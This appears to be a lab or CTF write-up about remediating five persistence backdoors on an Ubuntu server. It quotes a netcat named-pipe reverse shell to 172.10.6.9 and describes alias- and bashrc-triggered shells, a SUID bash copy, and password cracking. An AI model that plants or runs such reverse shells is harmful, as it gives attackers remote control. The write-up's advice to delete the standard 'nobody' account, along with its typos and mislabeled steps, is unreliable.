---
layout: default
---

**Scenario:**

A server was compromised and has been isolated. There are 5 backdoors (aka, persistence mechanisms) on the machine. These have to be remediated before bringing the server back online.

**Server IP Address:** `10.10.166.173`

**Server Credentials:**   `giorgio:armani`   -   root privileges

### PREPARATION

- Add the IP to /etc/hosts for DNS resolution
- SSH into the server with the given credentials

### **SYSTEM INFO GATHERING**

![image](https://github.com/user-attachments/assets/c9d59eda-13b0-47d1-975c-d0c0d52add16)

OS Version: Ubuntu 20.04.4 LTS

### USER INFO GATHERING

![image](https://github.com/user-attachments/assets/bb8c747b-b212-490d-97c6-441e137515da)


There is a file called `.bad_bash`, which has both a SUID bit set and executable privileges for everyone on the machine. And the file itself runs as root, which makes for a horrible combination.

Upon running this file, it predictably gives us a Bash shell to work in, and a quick look into the Sudo privileges assigned to the user in the current session shows that we have full privileges. 

We currently have root privileges as the user `giorgio`, which is expected for the investigation, but this is notable because the attacker likely was able to use a lower-privileged account on the machine to run higher-privileged commands. That being said this executable is almost positively created by the attacker as a method of persistence.

So, our first backdoor the `.bad_bash` executable.


### BASHRC INVESTIGATION

Next, we look into the `bashrc` file, which is basically a script that runs every time a user logs into a terminal session, and there is a very strange alias assignment going on here:

![image](https://github.com/user-attachments/assets/66284924-83d9-4c92-b505-a1abce14a499)

Every time `ls` is run in the terminal, a reverse shell is spawned at address `172.10.6.9` on port `6969`, which would allow someone (the attacker) to essentially control the machine remotely through an interactive Bash terminal. Beyond its basic function, this command also includes other parameters that are likely executed to keep this whole action a secret from the user. For example, `&` means the reverse shell will be spawned in the background and `disown` takes this further by separating reverse shell process from the terminal session itself, so even if the terminal is closed, the shell will continue to run in the background. This is a sure sign of persistence.

So, our second persistence mechanism is a reverse shell that triggers when the user starts up the terminal session.

### CRONTAB INVESTIGATION

We also find an interesting scheduled job running continuously:

![image](https://github.com/user-attachments/assets/4342ab64-d3bc-4ad2-911d-d4ff22e23b7c)

Here, the attacker seems to be creating yet another reverse shell that connects to the same IP `172.10.6.9` and port `6969`. The `mkfifo` command here points to the establishment of a relay connection, where `mkfifo` creates a named pipe that acts as a sort of bridge between the shell and the attacker. This opens up a two-way communication.

Here is how I understand this to work:

1. The bridge: `mkfifo /tmp f`    Creates a named pipe file called `f` in the `/tmp` directory that sets up the bridge which sends AND receives data
2. The receiver:  `cat /tmp/f`    is constantly listening to this created named pipe and waits for any input.
3. The operator: `| /bin/sh -i`   Any input it picks up it executed within an interactive shell
4. `| /usr/bin/nc 172.10.6.9 6969 >/tmp/f`   And, finally, the shell’s output after execution is both sent to the attacker at the specified IP and port and written back to the pipe itself `/tmp/f` , which opens the way for the communication loop.

Third persistence mechanism: a Netcat relay that is set up via a cronjob that runs all the time.

### ROOT INVESTIGATION

Upon signing into the root account, there is an instant error `Ncat: TIMEOUT`, followed by a command that, once again, points to an established shell with the attacker’s IP via `ncat`

![image](https://github.com/user-attachments/assets/913362d7-c9f7-4645-b7ef-60e5b28a207d)

Ncat is an enhanced version of the original Netcat and is essentially part of Nmap. Some of its features include support for encryption and better relay capabilities, which would make it preferable to the standard Netcat (nc) command.

A short investigation leads to the discovery of this very command being called in, once again, the Bashrc file, but this time for root:

![image.png](attachment:45593c5f-c264-47e5-8f94-96e83aea1264:image.png)

Every time a Root terminal is started up, Ncat will send a Bash shell to the attacker IP.

Fourth persistence mechanism: a shell spawned with Ncat every time a root terminal is started.

### FILE SYSTEM INVESTIGATION

While enumerating the machine earlier, I had noticed and taken note of an unusual username `nobody` in both the /etc/passwd and /etc/shadow files, where the latter contains the password hash.

![image](https://github.com/user-attachments/assets/ac531cc2-362c-4b73-9530-b9d488e1a906)

This may indeed be a new user created on the machine as a form of persistence, so the attacker has constant access to the machine.

Then, as a final step, I unshadowed the passwd and shadow files and successfully obtained the password for the `nobody` user:

![image](https://github.com/user-attachments/assets/c5c3dbd0-e19d-4e20-bd8b-1b97be363b35)

![image](https://github.com/user-attachments/assets/36c24766-01b3-41e2-9cd2-c094f69f5783)

`nobody:nobody`

Final persistence mechanism: a new user created on the machine

### REMEDIATION

Persistence Mechanism #1: simply remove the executable with `rm .bad_bash`

Persistence Mechanism #2: remove the line on the Crontab file:

1. `crontab -e`   Open up the crontab file to edit it
2. `I`   Switch to Insert mode (since this is Vim)
3. Remove the line
4. `ESC`   Go back to Command mode
5. `:wq`   Write the changes to the file and exit the editor

Persistence Mechanism #3: remove the alias line that sets up the relay in `bashrc`

Persistence Mechanism #4:  remove the Ncat command from root’s `bashrc`

Persistence Mechanism #5: remove the `nobody` user account and perform any other cleanup

1. `sudo userdel nobody`   Remove the user account
2. `find / -type f -user "nobody" 2>/dev/null`   Search for any files that the user owns
3. `sudo rm -r /nonexistent`   Remove the suspicious directory

And here, we actually located a directory called `nonexistent`, which includes files owned by the `nobody` user and also has a file called `.youfoundme`:

![image](https://github.com/user-attachments/assets/2f34fa11-a66f-41d0-87bf-1521b9c7655b)

With that, we have successfully found and removed all backdoor instances on this machine and are ready for operations to turn to normal…..after we’ve gone through the process another couple of times with a few more eyes. Can’t be too careful ;)

